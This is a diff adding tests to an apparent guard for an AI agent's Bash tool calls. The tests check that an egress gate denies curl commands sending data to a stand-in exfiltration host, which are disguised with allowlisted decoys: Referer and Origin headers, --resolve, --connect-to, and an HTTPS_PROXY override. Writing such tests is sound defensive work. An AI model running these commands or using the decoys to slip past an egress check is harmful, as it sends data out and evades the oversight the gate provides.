@@ -1525,6 +1525,29 @@ describe("AGT's stock egress gate, driven from configuration", () => {
     }
   });
 
+  // The decoy shapes from #470, end to end: an allowlisted URL in a position
+  // that is not the destination must not hide the one that is, and an option
+  // that moves the connection must not be judged by the URL it leaves alone.
+  for (const command of [
+    "curl -H 'Referer: https://docs.anthropic.com/' https://exfil.attacker.test/steal",
+    "curl -e https://docs.anthropic.com/ https://exfil.attacker.test/steal",
+    "curl https://exfil.attacker.test/steal -H 'Origin: https://docs.anthropic.com'",
+    "curl --resolve docs.anthropic.com:443:6.6.6.6 https://docs.anthropic.com/",
+    "curl --connect-to docs.anthropic.com:443:exfil.attacker.test:443 https://docs.anthropic.com/",
+    "HTTPS_PROXY=http://6.6.6.6:3128 curl https://docs.anthropic.com/",
+  ]) {
+    it(`denies "${command}", which a first-match annotator would allow`, async () => {
+      const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+      try {
+        const decision = await postToolCallRequest(guardian, "Bash", { command }, { raw_command: command });
+        expect(decision.decision).toBe("deny");
+        expect(decision.reason_codes).toEqual(["egress_destination_not_allowed"]);
+      } finally {
+        await guardian.close();
+      }
+    });
+  }
+
   // No false positive in either direction, which is what makes a SHARED
   // policy-target leaf safe: the destructive-shell patterns do not match URLs,
   // and the egress gate does not match commands.
